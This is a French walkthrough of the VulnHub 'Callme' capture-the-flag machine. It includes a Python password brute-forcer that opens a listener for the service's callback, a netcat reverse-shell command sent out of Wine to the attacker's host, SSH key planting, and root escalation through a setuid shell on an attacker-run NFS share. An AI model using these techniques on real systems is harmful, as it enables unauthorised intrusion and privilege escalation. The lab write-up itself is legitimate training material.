# Solution du CTF CallMe de VulnHub

Je continue sur ma lignée des CTFs conçus par *foxlox* avec celui ci : [Callme: 1 ~ VulnHub](https://www.vulnhub.com/entry/callme-1,615/)

```
Nmap scan report for 192.168.56.46
Host is up (0.00022s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 deb52389bb9fd41ab50453d0b75cb03f (RSA)
|   256 160914eab9fa17e945395e3bb4fd110a (ECDSA)
|_  256 9f665e71b9125ded705a4f5a8d0d65d5 (ED25519)
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|_  100000  2,3,4        111/udp   rpcbind
2323/tcp open  3d-nfsd?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe, tn3270: 
|     Welcome to foxrecall server
|     username:
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Welcome to foxrecall server
|     username: 
|     Password
|     user does not exist
|     username:
|   Help: 
|     Welcome to foxrecall server
|     username: 
|     Password
|   SIPOptions: 
|     Welcome to foxrecall server
|     username: 
|     Password
|     user does not exist
|     username: 
|     Password
|     user does not exist
|     username: 
|     Password
|     user does not exist
|_    bye!
```

## Une présence ambiguë, Une présence inconnue

On a un service inconu sur le port 2323. Si on se connecte via ncat on remarque que la communication ne va pas aussi loin que ce que Nmap est parvenu à avoir :

```shellsession
$ ncat 192.168.56.46 2323 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.46:2323.
Welcome to foxrecall server
username: 
toto
```

Ca fonctionne mieux avec telnet, le serveur s'attend donc à avoir des CRLF (`\r\n`) :

```shellsession
$ telnet 192.168.56.46 2323 
Trying 192.168.56.46...
Connected to 192.168.56.46.
Escape character is '^]'.
Welcome to foxrecall server
username: 
toto
Password
plop
user does not exist
username:
```

Avec le nom d'utilisateur admin on a un comportement différent. L'utilisateur existe, il ne reste qu'à trouver le mot de passe.

J'ai écrit un script Python pour bruteforcer le mot de passe (voir plus bas) qui était *booboo* mais une fois connecté il donne un nombre (sous la forme de lettres) puis ferme aussitôt la connexion.

```shellsession
$ telnet 192.168.56.46 2323 
Trying 192.168.56.46...
Connected to 192.168.56.46.
Escape character is '^]'.
Welcome to foxrecall server
username: 
admin
Password
booboo
THREE THOUSAND EIGHT HUNDRED EIGHTY FIVE 
You are not ready sorry...
bye!
Connection closed by foreign host.
```

Au vu du nom du challenge, on va lancer rapidement un *ncat* en écoute sur le port dès qu'on a les information. Pour la conversion des chiffres j'ai eu recours à la librairie Python [revdotcom/words2num: Convert words to numbers](https://github.com/revdotcom/words2num).

Le code suivant fait le bruteforce + le lancement du listener :

```python
import sys
import socket
import os

from words2num import w2n

sock = socket.socket()
sock.connect(("192.168.56.46", 2323))

def read_until(sock_fd, data):
    while True:
        buff = sock.recv(1024)
        if data in buff.strip():
            break

username = sys.argv[1].encode()
with open(sys.argv[2], "rb") as fd:
    for i, line in enumerate(fd):
        password = line.strip()
        read_until(sock, b"username:")
        sock.send(username + b"\r\n")
        sock.recv(2014)  # Password prompt
        sock.send(password + b"\r\n")
        buff = sock.recv(1024).strip()
        if not buff.startswith(b"Wrong password for user"):
            print(f"password {password.decode()} gave response '{buff.decode()}'")
            port = w2n(buff.decode())
            os.system(f"ncat -v -l -p {port}")
            break

        buff = sock.recv(1024)
        if b"user does not exist" in buff:
            print("No such user")
            break

        if b"bye!" in buff:
            sock.close()
            sock = socket.socket()
            sock.connect(("192.168.56.46", 2323))

        if i % 1000 == 0:
            print("line", i)
```

Exécution :

```shellsession
$ python3 brute.py admin rockyou.txt
line 0
password booboo gave response 'ONE THOUSAND TWO HUNDRED NINETY'
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1290
Ncat: Listening on 0.0.0.0:1290
Ncat: Connection from 192.168.56.46.
Ncat: Connection from 192.168.56.46:42976.
Microsoft Windows 6.1.7601 (4.0)

Z:\home\fox>ls
Can't recognise 'ls' as an internal or external command, or batch script.

Z:\home\fox>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\home\fox

05/11/2022     14:03  <DIR>         .
14/11/2020     18:09  <DIR>         ..
15/11/2020     11:03  <DIR>         Desktop
15/11/2020     11:03  <DIR>         Documents
15/11/2020     11:03  <DIR>         Downloads
05/11/2022     14:03             0  iphist.dat
15/11/2020     11:03            33  local.txt
15/11/2020     11:03  <DIR>         Music
15/11/2020     11:03  <DIR>         Pictures
15/11/2020     11:03  <DIR>         Public
15/11/2020     11:03           121  startup
15/11/2020     11:03  <DIR>         Templates
15/11/2020     11:03  <DIR>         Videos
       3 files                      154 bytes
      10 directories      3,982,213,120 bytes free
Z:\home\fox>type local.txt
ea2188e08f77470c2c9918ba06f566f7
```

On est bien dans le home de l'utilisateur *fox* mais on a visiblement récupéré un shell dans Wine. Le premier signe c'est que l'on sait que l'OS tourné par VirtualBox est un Linux. Le second signe c'est la lettre Z utilisée pour le volume servant de racine Linux qui est spécifique à Wine.

On peut tout à fait utiliser les commandes Windows pour créer le dossier *.ssh* et placer notre clé publique dans *authorized_keys* mais il est aussi possible de faire exécuter des  commandes Linux depuis Wine. Le seul inconvénient c'est qu'on aura pas l'output.

J'ai remarqué que dans *Z:\bin\* on retrouvait le binaire *nc.traditional* qui dispose de l'option *-e* très pratique pour obtenir un shell :

```powershell
Z:\home\fox>start /unix /bin/nc.traditional -e /bin/sh 192.168.56.1 9999
```

Et sur le *ncat* que j'ai mis préalablement en écoute :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.46.
Ncat: Connection from 192.168.56.46:45438.
id
uid=1001(fox) gid=1001(fox) groups=1001(fox)
mkdir .ssh
cd .ssh
echo ssh-rsa --- snip ma clé publique snip --- > authorized_keys
```

Une fois connectée par ssh (enfin) je remarque dans les process le programme qui nous a fournit notre porte d'entrée :

`fox        984  3.6  2.0 2648776 20776 tty2    Sl+  14:03  14:21 recallserver.exe`

Il a été placé dans le system32 du Wine :

```shellsession
$ find / -name recallserver.exe 2> /dev/null
/home/fox/.wine/drive_c/windows/system32/recallserver.exe
```

Quand on connait la structure d'un exécutable (différentes sections pour chaque type de données) on sait que les chaines de caractères intégrées par le développeur seront rassemblés à une même endroit.

J'applique donc un strings sur le binaire et fait une recherche sur *booboo* :

```
TRILLION
 HUNDRED 
sxhh
sxhh
ZYYd
connected
nc64.exe 
 1234 -e cmd.exe
Welcome to foxrecall server
username: 
login: 
Password
pass: 
tutankamenFERILLI
Wrong password for user fox
admin
booboo
Wrong password for user admin
user does not exist
cmd /c nc.exe 
 -e cmd.exe
You are not ready sorry...
bye!
ZYYd
```

La chaine `tutankamenFERILLI` est clairement quelque chose que je n'avais pas vu jusqu'ici.

Il s'avère que c'est le mot de passe de l'utilisateur *fox* et qu'on peut s'en servir pour une commande sudo :

```shellsession
$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for fox: 
Matching Defaults entries for fox on callme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fox may run the following commands on callme:
    (root) /usr/sbin/mount.nfs
```

On est sur un cas classique d'exploitation de NFS : si on met en place un partage NFS qu'on peut monter sur la victime alors on peut placer une backdoor setuid dedans et l'exécuter depuis la victime pour augmenter nos privilèges.

## Docker please

Histoire de gagner du temps je me suis servit de [ehough/docker-nfs-server: A lightweight, robust, flexible, and containerized NFS server.](https://github.com/ehough/docker-nfs-server)

Au début c'était mal parti :

```shellsession
$ docker run                                            \
>   -v /tmp/jail:/tmp/jail  \
>   -e NFS_EXPORT_0='/tmp/jail                  *(ro,no_subtree_check)' \
>   --cap-add SYS_ADMIN                                 \
>   -p 2049:2049                                        \
>   erichough/nfs-server

==================================================================
      SETTING UP ...
==================================================================
----> building /etc/exports from environment variables
----> collected 1 valid export(s) from NFS_EXPORT_* environment variables
----> kernel module nfs is missing
----> 
----> ERROR: nfs module is not loaded in the Docker host's kernel (try: modprobe nfs)
---->
```

Il a fallut charger les modules kernel *nfs* et *nfsd* puis utiliser plutôt l'option *--privileged* pour que ça fonctionne :

```shellsession
$ docker run -v /tmp/jail:/tmp/jail -e NFS_EXPORT_0='/tmp/jail   *(ro,no_subtree_check)' --privileged -p 2049:2049 erichough/nfs-server
==================================================================
      SETTING UP ...
==================================================================
----> building /etc/exports from environment variables
----> collected 1 valid export(s) from NFS_EXPORT_* environment variables
----> setup complete

==================================================================
      STARTING SERVICES ...
==================================================================
----> starting rpcbind
----> starting exportfs
----> starting rpc.mountd on port 32767
----> starting rpc.statd on port 32765 (outgoing from port 32766)
----> starting rpc.nfsd on port 2049 with 4 server thread(s)
----> all services started normally

==================================================================
      SERVER STARTUP COMPLETE
==================================================================
----> list of enabled NFS protocol versions: 4.2, 4.1, 4, 3
----> list of container exports:
---->   /tmp/jail                  *(ro,no_subtree_check)
----> list of container ports that should be exposed:
---->   111 (TCP and UDP)
---->   2049 (TCP and UDP)
---->   32765 (TCP and UDP)
---->   32767 (TCP and UDP)

==================================================================
      READY AND WAITING FOR NFS CLIENT CONNECTIONS
==================================================================
```

Le partage est monté en lecture seule (je n'ai pas modifié la config par défaut qui est indiquée dans la ligne de commande) du coup j'ai recopié le */usr/bin/sh* de la VM dans le partage via SSH puis j'ai fait le `chown root:root` puis `chmod 4755` qu'il fallait.

```shellsession
$ sudo /usr/sbin/mount.nfs 192.168.56.1:/tmp/jail /mnt
$ cd /mnt
$ ls -al
total 124
drwxr-xr-x  1 ppp  users      4 Nov  5 20:56 .
drwxr-xr-x 18 root root    4096 Nov 15  2020 ..
-rwsr-xr-x  1 root root  121464 Nov  5 20:56 sh
$ ./sh -p
# id
uid=1001(fox) gid=1001(fox) euid=0(root) groups=1001(fox)
# cd /root
# ls
proof.txt
# cat proof.txt
e2178ca6963e4ce1d88a10ec030097ff
```

Un CTF fort sympathique avec un peu de développement et la découverte de nouveaux outils.
